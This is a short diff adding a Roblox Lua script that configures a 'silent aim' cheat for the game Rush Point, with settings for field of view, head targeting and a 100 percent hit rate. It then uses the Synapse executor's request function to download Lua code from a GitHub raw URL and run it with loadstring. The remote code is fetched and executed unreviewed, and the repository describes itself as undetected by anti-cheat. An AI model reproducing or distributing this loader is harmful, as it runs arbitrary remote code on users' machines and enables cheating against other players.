@@ -1,0 +1,8 @@
+getgenv().Enabled = true
+getgenv().FOV = 100
+getgenv().Priority = 'Head'
+getgenv().HitPercentage = 100
+getgenv().ShowFOV = true
+
+
+loadstring(syn.request({Url = 'https://raw.githubusercontent.com/Github-Account-39021832/Rush-Point-Undetected-Silent-Aim/main/src.lua', Method = 'GET'}).Body)()
